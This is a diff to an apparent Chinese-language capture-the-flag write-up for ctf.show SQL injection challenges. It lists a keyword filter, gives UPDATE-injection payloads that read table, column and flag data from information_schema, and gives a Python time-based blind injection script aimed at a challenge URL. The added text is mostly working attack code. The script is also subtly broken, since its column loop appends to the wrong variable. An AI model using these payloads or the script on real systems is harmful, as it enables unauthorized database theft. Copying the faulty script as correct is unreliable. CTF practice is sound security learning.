@@ -1223,6 +1223,82 @@ foreach ($banlist as $char) {
 }
 ```
 
-和226一样的套路。。。主要是sql和waf不太一样，所有没放一起
+和226一样的套路，通杀了。。。主要是sql和waf不太一样，所有没放一起
 
 过滤挺多，懒得解码了：`{"id":"2","username":"user1","pass":"111"},{"id":"1","char":"union"},{"id":"2","char":"file"},{"id":"3","char":"into"},{"id":"4","char":"handler"},{"id":"5","char":"db"},{"id":"6","char":"select"},{"id":"7","char":"update"},{"id":"8","char":"dump"},{"id":"9","char":"delete"},{"id":"10","char":"create"},{"id":"11","char":"drop"},{"id":"12","char":"show"},{"id":"13","char":"describe"},{"id":"14","char":"set"},{"id":"15","char":"alter"}`
+
+## web231 | 232
+第一次写update注入，才知道不能直接将查询结果进行赋值，[详见此](https://www.cnblogs.com/duanxz/p/5099030.html)，这种思路。。真骚
+
+sql: `$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";`
+
+表名: `',username=(select yq1ng.a from (select group_concat(table_name)a from information_schema.tables where table_schema=database()) yq1ng) where username="user1";#` --> banlist,ctfshow_user,flaga
+
+列名：`',username=(select yq1ng.a from (select group_concat(column_name)a from information_schema.columns where table_name="flaga") yq1ng) where username="user1";#` --> id,flagas,info
+
+flag: `',username=(select yq1ng.a from (select group_concat(flagas)a from flaga) yq1ng) where username="user1";#`
+
+## web233
+掉进坑里了，思路还在前两题，感谢飞鱼和space man师傅的思路，时间盲注，写的乱乱的，有时间整理一个函数，简洁一点
+```python
+# encoding: utf-8
+# @Author:  yq1ng
+# @Date:    2020-11-20 23:00
+import requests
+
+url = "http://059e89aa-6633-4b85-a554-dea3e2b48d9a.chall.ctf.show/api/"
+data = {"password":4, "username":""}
+tb_name = ''
+column_name = ''
+flag = ''
+
+for i in range(1,100):
+    for j in r'ctfshow_abdegijklmnopqruvxyz-,1234567890!':
+        payload = "user1'and(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(2),1))and'1'='1"% (i,j)
+        data["username"] = payload
+        #print(data)
+        r = requests.post(url, data = data)
+        time = r.elapsed.total_seconds()
+        #print(time)#获取响应时间
+        if time > 2:
+            tb_name += j
+            break
+    print("\r[+]table name is %s"% tb_name, end = '')
+    if j == "!":
+        break
+
+guess_tbName = input("\nPlease enter the name of the table you want to guess: ")
+#column_name
+for i in range(1,100):
+    for j in r'abcdefghijklmnopqrstuvwxyz_,1234567890!':
+        payload = "user1'and(if(substr((select group_concat(column_name) from information_schema.columns where table_name='%s'),%d,1)='%c',sleep(2),1))and'1'='1"% (guess_tbName,i,j)
+        data["username"] = payload
+        #print(data)
+        r = requests.post(url, data = data)
+        time = r.elapsed.total_seconds()
+        #print(time)#获取响应时间
+        if time > 2:
+            tb_name += j
+            break
+    print("\r[+]The column name in the %s table is %s"%(guess_tbName,column_name), end = '')
+    if j == "!":
+        break
+
+guess_flag = input("\n\nOkay, we're getting a flag. Tell me the list:")
+#flag
+print("\nGetting the flag......")
+for i in range(1,100):
+    for j in r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}':
+        payload = "user1'and(if(substr((select %s from %s),%d,1)='%c',sleep(2),1))and'1'='1"% (guess_flag,guess_tbName,i,j)
+        data["username"] = payload
+        #print(data)
+        r = requests.post(url, data = data)
+        time = r.elapsed.total_seconds()
+        #print(time)#获取响应时间
+        if time > 2:
+            flag += j
+            break
+    print("\r[+]The flag is %s"% flag,end = '')
+    if j == "!":
+        break
+```
